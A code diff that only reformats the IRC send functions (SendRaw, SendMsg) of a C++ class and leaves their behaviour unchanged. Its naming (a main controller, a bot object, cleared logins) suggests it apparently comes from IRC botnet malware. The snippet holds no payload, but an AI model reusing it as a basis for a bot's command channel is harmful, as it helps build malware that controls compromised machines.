@@ -403,22 +403,45 @@ CString CIRC::NetInfo()
 bool CIRC::SendRaw(char *szMsg)
 {	if(g_cMainCtrl.m_cBot.si_usessl.bValue)
 	{	if(m_csslSocket.Write(szMsg, strlen(szMsg))<strlen(szMsg))
-		{	m_bJoined=false; m_bConnected=false; xClose(m_sSocket);
-			m_sSocket=INVALID_SOCKET; g_cMainCtrl.m_cMac.ClearLogins(); return false; }
-		else return true; }
+        {
+            m_bJoined=false;
+            m_bConnected=false;
+            xClose(m_sSocket);
+            m_sSocket=INVALID_SOCKET;
+            g_cMainCtrl.m_cMac.ClearLogins();
+            return false;
+        }
+        else return true;
+    }
 	else
 	{	if(xWrite(m_sSocket, szMsg, strlen(szMsg))<strlen(szMsg))
-		{	m_bJoined=false; m_bConnected=false; xClose(m_sSocket);
-			m_sSocket=INVALID_SOCKET; g_cMainCtrl.m_cMac.ClearLogins(); return false; }
-		else return true; } }
+        {
+            m_bJoined=false;
+            m_bConnected=false;
+            xClose(m_sSocket);
+            m_sSocket=INVALID_SOCKET;
+            g_cMainCtrl.m_cMac.ClearLogins();
+            return false;
+        }
+        else
+            return true;
+    }
+}
 bool CIRC::SendRawFormat(const char *szFmt, ...)
 {	va_list va_alist; char formatbuf[8192]; va_start(va_alist, szFmt);
 	vsnprintf(formatbuf, sizeof(formatbuf), szFmt, va_alist); va_end(va_alist);
 	return SendRaw(formatbuf); }
 
 bool CIRC::SendMsg(bool bSilent, bool bNotice, char *szMsg, char *szDst)
-{	if(bSilent) return false; CString sTheCmd; if(bNotice) sTheCmd.Assign("NOTICE"); else sTheCmd.Assign("PRIVMSG");
-	CString sSendBuf; sSendBuf.Format("%s %s :%s\r\n", sTheCmd.CStr(), szDst, szMsg);
+{	if(bSilent)
+        return false;
+    CString sTheCmd;
+    if(bNotice)
+        sTheCmd.Assign("NOTICE");
+    else
+        sTheCmd.Assign("PRIVMSG");
+    CString sSendBuf;
+    sSendBuf.Format("%s %s :%s\r\n", sTheCmd.CStr(), szDst, szMsg);
 	return SendRaw(sSendBuf.Str()); }
 bool CIRC::SendFormat(bool bSilent, bool bNotice, char *szDst, const char *szFmt, ...)
 {	va_list va_alist; char formatbuf[8192]; va_start(va_alist, szFmt);
